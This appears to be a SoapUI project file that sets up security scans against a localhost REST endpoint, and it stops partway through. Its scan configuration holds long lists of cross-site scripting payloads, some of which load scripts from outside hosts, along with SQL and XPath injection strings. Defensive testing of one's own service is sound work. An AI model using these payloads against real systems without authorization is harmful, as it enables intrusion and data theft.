<?xml version="1.0" encoding="UTF-8"?>
<con:soapui-project id="57597405-185a-4b41-b31e-cd9c19702b30" created="2.8.0" activeEnvironment="Default environment" name="Test localhost 1234" resourceRoot="" updated="3.7.0 2021-03-30T19:14:40Z" encryptionMode="Not encrypted" xmlns:con="http://eviware.com/soapui/config">
    <con:settings/>
    <con:interface xsi:type="con:RestService" id="2b9e0289-05d6-4a74-ab5e-1434e2aba4bb" wadlVersion="http://wadl.dev.java.net/2009/02" name="http://localhost:1234" type="rest" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
        <con:settings/>
        <con:definitionCache/>
        <con:endpoints>
            <con:endpoint>http://localhost:1234</con:endpoint>
        </con:endpoints>
        <con:resource name="" path="" id="15ff2ab2-3aaa-4dc8-abe6-69f1b22632fb">
            <con:settings/>
            <con:parameters/>
            <con:method name="" id="b0803dee-9aac-416a-ac48-f93ac74d17d3" method="GET">
                <con:settings/>
                <con:parameters/>
                <con:representation type="RESPONSE">
                    <con:mediaType xsi:nil="true"/>
                    <con:status>0</con:status>
                    <con:params/>
                    <con:element>data</con:element>
                </con:representation>
                <con:request name="Request 1" id="8b5061d1-caa1-47b3-9665-9d0b908e24fe" mediaType="application/json">
                    <con:settings/>
                    <con:endpoint>http://localhost:1234</con:endpoint>
                    <con:request/>
                    <con:credentials>
                        <con:selectedAuthProfile>No Authorization</con:selectedAuthProfile>
                        <con:authType>No Authorization</con:authType>
                    </con:credentials>
                    <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
                    <con:parameters/>
                </con:request>
            </con:method>
        </con:resource>
    </con:interface>
    <con:testSuite id="ec338374-8e12-4fea-8b04-9c3a9fd5dd82" name="http://localhost:1234 TestSuite">
        <con:settings/>
        <con:savedRecentRuns>1</con:savedRecentRuns>
        <con:runType>SEQUENTIAL</con:runType>
        <con:testCase id="de46c96c-7ac7-4270-b19e-acf2e78d1e0b" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="The One With Passing Assertion" searchProperties="true" timeout="0">
            <con:settings/>
            <con:savedRecentRuns>1</con:savedRecentRuns><con:testStep type="restrequest" name="Request 1" id="b505e01f-bade-4f77-8e40-c43287b79b55" disabled="true">
                <con:settings/>
                <con:config service="http://localhost:1234" resourcePath="" methodName="" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                    <con:restRequest name="Request 1" id="8b5061d1-caa1-47b3-9665-9d0b908e24fe" mediaType="application/json">
                        <con:settings>
                            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting>
                        </con:settings>
                        <con:endpoint>http://localhost:1234</con:endpoint>
                        <con:request/>
                        <con:originalUri>http://localhost/</con:originalUri>
                        <con:assertion type="Valid HTTP Status Codes" id="7ad86c41-5ed3-4c11-9822-c3ac8863b87b" name="Valid HTTP Status Codes">
                            <con:settings/>
                            <con:configuration>
                                <codes>200</codes>
                            </con:configuration>
                        </con:assertion>

                        <con:credentials>
                            <con:selectedAuthProfile>No Authorization</con:selectedAuthProfile>
                            <con:authType>No Authorization</con:authType>
                        </con:credentials>
                        <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
                        <con:parameters/>
                    </con:restRequest>
                </con:config>
            </con:testStep>
            <con:testStep type="delay" name="delay 30 sek" id="057b150c-2c0e-4a60-af09-86909acbe57e"><con:settings/><con:config><delay>30000</delay></con:config></con:testStep><con:properties/>
            <con:reportParameters/>
            <con:securityTest id="6662ae12-9abe-4985-82d5-1ed9f3648c35" testCaseId="de46c96c-7ac7-4270-b19e-acf2e78d1e0b" name="SecurityTest 1" failSecurityTestOnScanErrors="true">
                <con:settings/>
                <con:testStepSecurityTest>
                    <con:testStepId>b505e01f-bade-4f77-8e40-c43287b79b55</con:testStepId>
                    <con:testStepSecurityScan type="BoundaryScan" name="Boundary Scan" id="26c05921-8713-40ec-9243-7c50b1e18513" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
                        <con:settings/>
                        <con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:assertion type="Sensitive Information Exposure" id="e28a8d2c-8664-425c-9b48-c7eaea82e57a" name="Sensitive Information Exposure">
                            <con:configuration/>
                        </con:assertion>
                        <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                            <con:strategy>ONE_BY_ONE</con:strategy>
                            <con:delay>100</con:delay>
                        </con:executionStrategy>
                    </con:testStepSecurityScan>
                    <con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="41ac5ccb-1476-48c6-a235-42e1c990fea0" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
                        <con:settings/>
                        <con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                            <con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings>
                            <con:parameterExposureStrings>
                                ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings><![CDATA[
                                <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings>
                            <con:parameterExposureStrings><![CDATA[
                                <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings>
                            <con:parameterExposureStrings><![CDATA[
                                <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG SRC="jav ascript:alert('XSS');">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' >
                                out
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' >
                                out
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14; javascript:alert('XSS');">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>;
                                REL=stylesheet">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;STYLE>li {list-style-image:
                                url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh"
                                CONTENT="0;url=javascript:alert('XSS');">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh"
                                CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;
                                URL=http://;URL=javascript:alert('XSS');">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;DIV STYLE="background-image:
                                url(javascript:alert('XSS'))">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;DIV
                                STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A
                                CLASS=XSS>&lt;/A>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;STYLE
                                type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet"
                                DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param
                                name=url value=javascript:alert('XSS')>&lt;/OBJECT>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf"
                                AllowScriptAccess="always">&lt;/EMBED>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;EMBED
                                SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH
                                A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv
                                MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs
                                aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw
                                IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh
                                TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>
                                a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[
                                <![CDATA[cript:alert('XSS');">]]]]>><![CDATA[
                                </C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings>
                            <con:parameterExposureStrings><![CDATA[
                                <XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings>
                            <con:parameterExposureStrings><![CDATA[
                                <HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>');
                                ?>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;IMG
                                SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode">
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>Redirect 302 /a.jpg
                                http://soapui.org/admin.asp&amp;deleteuser
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE"
                                CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;SCRIPT "a='>'"
                                SRC="http://soapui.org/xss.js">&lt;/SCRIPT>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;SCRIPT a=">'>"
                                SRC="http://soapui.org/xss.js">&lt;/SCRIPT>
                            </con:parameterExposureStrings>
                            <con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT
                                SRC="http://soapui.org/xss.js">&lt;/SCRIPT>
                            </con:parameterExposureStrings>
                        </con:config>
                        <con:assertion type="Sensitive Information Exposure" id="99ece234-aa8f-45f6-8cf5-817cbb89ac20" name="Sensitive Information Exposure">
                            <con:configuration/>
                        </con:assertion>
                        <con:assertion type="CrosSiteScript" id="dc5768b7-54fb-49d0-916a-e9a28e743d75" name="Cross Site Scripting Detection">
                            <con:configuration/>
                        </con:assertion>
                        <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                            <con:strategy>ONE_BY_ONE</con:strategy>
                            <con:delay>100</con:delay>
                        </con:executionStrategy>
                    </con:testStepSecurityScan>
                    <con:testStepSecurityScan type="FuzzingScan" name="Fuzzing Scan" id="1c94d0f0-eb76-4843-b529-5c2eb1f5c344" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
                        <con:settings/>
                        <con:config xsi:type="con:FuzzerScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                            <con:minimal>5</con:minimal>
                            <con:maximal>15</con:maximal>
                            <con:numberOfRequest>100</con:numberOfRequest>
                        </con:config>
                        <con:assertion type="Sensitive Information Exposure" id="b7562fe7-70e8-4008-b940-7a20cb314d68" name="Sensitive Information Exposure">
                            <con:configuration/>
                        </con:assertion>
                        <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                            <con:strategy>ALL_AT_ONCE</con:strategy>
                            <con:delay>100</con:delay>
                        </con:executionStrategy>
                    </con:testStepSecurityScan>
                    <con:testStepSecurityScan type="InvalidTypesSecurityScan" name="Invalid Types" id="f9f7b678-266f-4ccc-8e52-a036559c09ae" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
                        <con:settings/>
                        <con:config xsi:type="con:InvalidSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                            <con:typesList>
                                <con:type>3</con:type>
                                <con:value>true</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>4</con:type>
                                <con:value>GpM7</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>5</con:type>
                                <con:value>0FB7</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>9</con:type>
                                <con:value>-1E4f</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>10</con:type>
                                <con:value>12.45E+12</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>11</con:type>
                                <con:value>-1.23</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>12</con:type>
                                <con:value>SoapUI is the&#13; best
                                </con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>13</con:type>
                                <con:value>P1Y2M3DT10H30M12.3S</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>14</con:type>
                                <con:value>1999-05-31T13:20:00.000-05:00</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>16</con:type>
                                <con:value>1999-05-31</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>22</con:type>
                                <con:value>-1267896799</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>23</con:type>
                                <con:value>-882223334991111111</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>24</con:type>
                                <con:value>-2147483647</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>25</con:type>
                                <con:value>-32768</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>26</con:type>
                                <con:value>127</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>27</con:type>
                                <con:value>0</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>28</con:type>
                                <con:value>-1</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>29</con:type>
                                <con:value>1</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>30</con:type>
                                <con:value>1267896799</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>31</con:type>
                                <con:value>882223334991111111</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>32</con:type>
                                <con:value>294967295</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>33</con:type>
                                <con:value>65535</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>34</con:type>
                                <con:value>255</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>35</con:type>
                                <con:value>SoapUI is the best</con:value>
                            </con:typesList>
                            <con:typesList>
                                <con:type>36</con:type>
                                <con:value>SoapUI is the best</con:value>
                            </con:typesList>
                        </con:config>
                        <con:assertion type="Sensitive Information Exposure" id="d7295f15-b6bd-4d22-b85a-55e6a2349beb" name="Sensitive Information Exposure">
                            <con:configuration/>
                        </con:assertion>
                        <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                            <con:strategy>ONE_BY_ONE</con:strategy>
                            <con:delay>100</con:delay>
                        </con:executionStrategy>
                    </con:testStepSecurityScan>
                    <con:testStepSecurityScan type="SQLInjectionScan" name="SQL Injection" id="a1f4fa62-3dab-4c36-9d2f-e7f90b25d186" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
                        <con:settings/>
                        <con:config xsi:type="con:SQLInjectionScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                            <con:sqlInjectionStrings>' or '1'='1</con:sqlInjectionStrings>
                            <con:sqlInjectionStrings>'--</con:sqlInjectionStrings>
                            <con:sqlInjectionStrings>1'</con:sqlInjectionStrings>
                            <con:sqlInjectionStrings>admin'--</con:sqlInjectionStrings>
                            <con:sqlInjectionStrings>/*!10000%201/0%20*/</con:sqlInjectionStrings>
                            <con:sqlInjectionStrings>/*!10000 1/0 */</con:sqlInjectionStrings>
                            <con:sqlInjectionStrings>1/0</con:sqlInjectionStrings>
                            <con:sqlInjectionStrings>'%20o/**/r%201/0%20--</con:sqlInjectionStrings>
                            <con:sqlInjectionStrings>' o/**/r 1/0 --</con:sqlInjectionStrings>
                            <con:sqlInjectionStrings>;</con:sqlInjectionStrings>
                            <con:sqlInjectionStrings>'%20and%201=2%20--</con:sqlInjectionStrings>
                            <con:sqlInjectionStrings>' and 1=2 --</con:sqlInjectionStrings>
                            <con:sqlInjectionStrings>test�%20UNION%20select%201,%20@@version,%201,%201;�
                            </con:sqlInjectionStrings>
                            <con:sqlInjectionStrings>test� UNION select 1, @@version, 1, 1;�</con:sqlInjectionStrings>
                        </con:config>
                        <con:assertion type="Sensitive Information Exposure" id="1fb86474-7177-4e0e-b39a-8fa2a79af066" name="Sensitive Information Exposure">
                            <con:configuration/>
                        </con:assertion>
                        <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                            <con:strategy>ONE_BY_ONE</con:strategy>
                            <con:delay>100</con:delay>
                        </con:executionStrategy>
                    </con:testStepSecurityScan>
                    <con:testStepSecurityScan type="XPathInjectionSecurityScan" name="XPath Injection" id="f58d76c2-9fed-4f57-9267-e58d4f0757cf" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
                        <con:settings/>
                        <con:config xsi:type="con:XPathInjection" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                            <con:xpathList>or name(//users/LoginID[1]) = 'LoginID' or 'a'='b</con:xpathList>
                            <con:xpathList>' or '1'='1</con:xpathList>
                            <con:xpathList>1/0</con:xpathList>
                            <con:xpathList>'%20o/**/r%201/0%20--</con:xpathList>
                            <con:xpathList>' o/**/r 1/0 --</con:xpathList>
                            <con:xpathList>;</con:xpathList>
                            <con:xpathList>'%20and%201=2%20--</con:xpathList>
                            <con:xpathList>' and 1=2 --</con:xpathList>
                            <con:xpathList>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:xpathList>
                            <con:xpathList>test� UNION select 1, @@version, 1, 1;�</con:xpathList>
                        </con:config>
                        <con:assertion type="Sensitive Information Exposure" id="b2d0db33-50db-474c-8d14-24147b5bd78f" name="Sensitive Information Exposure">
                            <con:configuration/>
                        </con:assertion>
                        <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                            <con:strategy>ONE_BY_ONE</con:strategy>
                            <con:delay>100</con:delay>
                        </con:executionStrategy>
                    </con:testStepSecurityScan>
                    <con:testStepSecurityProScan type="HttpMethodFuzzingScan" name="HTTP Method Fuzzing" id="51b7de23-a12f-422a-a0b4-4a9d59a77a0a" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
                        <con:settings/>
                        <con:config xsi:type="con:HttpMethodFuzzingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                            <con:deselectedMethods/>
                        </con:config>
